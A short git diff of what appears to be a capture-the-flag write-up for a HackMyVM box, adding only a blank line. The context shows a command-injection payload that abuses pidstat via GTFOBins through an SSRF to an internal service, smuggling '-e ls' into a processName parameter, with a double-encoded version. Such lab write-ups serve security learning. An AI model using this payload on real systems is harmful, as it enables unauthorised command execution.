@@ -105,6 +105,7 @@ Using https://gtfobins.github.io/gtfobins/pidstat/, we see that a system command
 To gain RCE, the URL part where the command is being executed, needs to be URL encoded twice, as we are essentially going through two website:
 
 Original URL: `POST /index.php?url=http://boxing.hmv@127.0.0.1:5000?processName=processName -e ls `
+
 Encoded URL: `POST /index.php?url=http://boxing.hmv@127.0.0.1:5000?processName=processName%2b-e%2bls%2b`
 
 ![[Pasted image 20241102122355.png]]
